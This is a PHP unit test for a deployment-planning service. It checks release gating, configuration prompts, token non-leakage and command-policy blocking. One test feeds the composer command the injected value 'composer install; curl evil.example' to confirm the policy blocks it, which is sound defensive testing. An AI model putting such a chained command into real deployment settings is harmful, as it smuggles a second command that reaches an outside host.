<?php

declare(strict_types=1);

namespace Weline\Deploy\Test\Unit\Service;

\defined('BP') || \define('BP', \dirname(__DIR__, 7) . \DIRECTORY_SEPARATOR);
\defined('DS') || \define('DS', \DIRECTORY_SEPARATOR);
\defined('APP_PATH') || \define('APP_PATH', BP . 'app' . DS);
\defined('APP_ETC_PATH') || \define('APP_ETC_PATH', APP_PATH . 'etc' . DS);
\defined('APP_CODE_PATH') || \define('APP_CODE_PATH', APP_PATH . 'code' . DS);
\defined('VENDOR_PATH') || \define('VENDOR_PATH', BP . 'vendor' . DS);
\defined('PUB') || \define('PUB', BP . 'pub' . DS);
\defined('DEV') || \define('DEV', false);
\defined('DEBUG') || \define('DEBUG', false);
\defined('SANDBOX') || \define('SANDBOX', false);
require_once APP_CODE_PATH . 'Weline/Framework/Common/functions.php';

use PHPUnit\Framework\TestCase;
use Weline\Deploy\Service\DeployConfigService;
use Weline\Deploy\Service\DeployMachinePlanService;
use Weline\Deploy\Service\DeployProjectCommandPolicyService;
use Weline\Deploy\Service\DeployReleaseControlService;
use Weline\Deploy\Service\DeployWebhookSetupService;

final class DeployMachinePlanServiceTest extends TestCase
{
    public function testLocalTargetIsExplicitlyNotApplicable(): void
    {
        $service = $this->service([]);

        $plan = $service->build(['operation' => 'release', 'target' => 'local']);

        self::assertSame('deploy-machine-plan.v1', $plan['schema_version']);
        self::assertSame('not_applicable', $plan['status']);
        self::assertFalse($plan['development_blocked']);
        self::assertTrue($plan['deployment_blocked']);
        self::assertFalse($plan['release_executed']);
    }

    public function testMissingConfigurationProducesOrderedQuestionsWithoutWriting(): void
    {
        $service = $this->service([]);

        $plan = $service->build(['operation' => 'config', 'target' => 'staging']);

        self::assertSame('needs_configuration', $plan['status']);
        self::assertSame(
            ['project_repo_url', 'deploy_root', 'webhook_path', 'webhook_secret', 'base_url'],
            array_column($plan['configuration']['questions'], 'key'),
        );
        self::assertFalse($plan['repository_written']);
        self::assertFalse($plan['settings_written']);
    }

    public function testReleasePlanRequiresCommitOrTagAndNeverExecutes(): void
    {
        $service = $this->service($this->completeSettings());

        $missingRef = $service->build(['operation' => 'release', 'target' => 'production']);
        self::assertSame('blocked', $missingRef['status']);
        self::assertSame('REF_SELECTION_REQUIRED', $missingRef['blockers'][0]['code']);

        $commit = $service->build([
            'operation' => 'release',
            'target' => 'production',
            'ref_type' => 'commit',
            'ref' => '0123456789abcdef0123456789abcdef01234567',
            'base_url' => 'https://deploy.example.test',
        ]);
        self::assertSame('ready', $commit['status']);
        self::assertSame('commit', $commit['release']['ref_type']);
        self::assertFalse($commit['release_executed']);
        self::assertFalse($commit['orchestrator_called']);
        self::assertTrue($commit['requires_execution_authorization']);
        self::assertArrayNotHasKey('GIT_TOKEN', $commit['release']['config_summary']);

        $tag = $service->build([
            'operation' => 'release',
            'target' => 'staging',
            'ref_type' => 'tag',
            'ref' => 'v1.2.3',
            'base_url' => 'https://deploy.example.test',
        ]);
        self::assertSame('ready', $tag['status']);
        self::assertSame('refs/tags/v1.2.3', $tag['release']['ref']);
    }

    public function testCommandPolicyFailureBlocksDeploymentPlan(): void
    {
        $settings = $this->completeSettings();
        $settings['run_composer_install'] = '1';
        $settings['composer_command'] = 'composer install; curl evil.example';
        $service = $this->service($settings);

        $plan = $service->build([
            'operation' => 'preflight',
            'target' => 'production',
            'base_url' => 'https://deploy.example.test',
        ]);

        self::assertSame('blocked', $plan['status']);
        self::assertContains('command_policy', array_column($plan['checks'], 'name'));
        self::assertTrue($plan['deployment_blocked']);
    }

    /** @param array<string,mixed> $settings */
    private function service(array $settings): DeployMachinePlanService
    {
        $config = $this->createMock(DeployConfigService::class);
        $config->method('getSettings')->willReturn(array_merge([
            'project_remote' => 'origin',
            'run_composer_install' => '0',
            'composer_command' => '',
            'post_deploy_command' => '',
            'backup_before_deploy' => '1',
            'deploy_force_reset' => '0',
        ], $settings));
        $config->method('getProjectDeployConfig')->willReturn([
            'GIT_REPO_URL' => (string) ($settings['project_repo_url'] ?? ''),
            'GIT_TOKEN' => 'must-not-leak',
        ]);

        $control = $this->createMock(DeployReleaseControlService::class);
        $control->method('buildReleaseParams')->willReturnCallback(
            static function (string $type, string $ref): array {
                return [
                    'trigger' => 'manual',
                    'ref_type' => $type,
                    'ref' => $type === 'tag' && !str_starts_with($ref, 'refs/tags/') ? 'refs/tags/' . $ref : $ref,
                    'deploy_version_hint' => $type === 'commit' ? substr($ref, 0, 12) : $ref,
                    'git_checkout' => $type === 'commit' ? $ref : null,
                    'git_tag' => $type === 'tag' ? $ref : null,
                    'force' => false,
                    'no_backup' => false,
                    'config' => ['DEPLOY_ROOT' => (string) ($settings['deploy_root'] ?? ''), 'GIT_TOKEN' => 'must-not-leak'],
                ];
            },
        );

        $webhook = $this->createMock(DeployWebhookSetupService::class);
        $webhook->method('buildVersionUrl')->willReturn('https://deploy.example.test/~wh~fixture/version');

        return new class($config, $control, new DeployProjectCommandPolicyService(), $webhook) extends DeployMachinePlanService {
            protected function probeWebhookHealth(string $url): array
            {
                return ['status' => 'pass', 'http_status' => 200, 'url_hash' => hash('sha256', $url)];
            }
        };
    }

    /** @return array<string,string> */
    private function completeSettings(): array
    {
        return [
            'project_repo_url' => 'git@example.test:owner/project.git',
            'deploy_root' => (string) getcwd(),
            'webhook_path' => '~wh~fixture',
            'webhook_secret' => 'fixture-secret-value',
        ];
    }
}
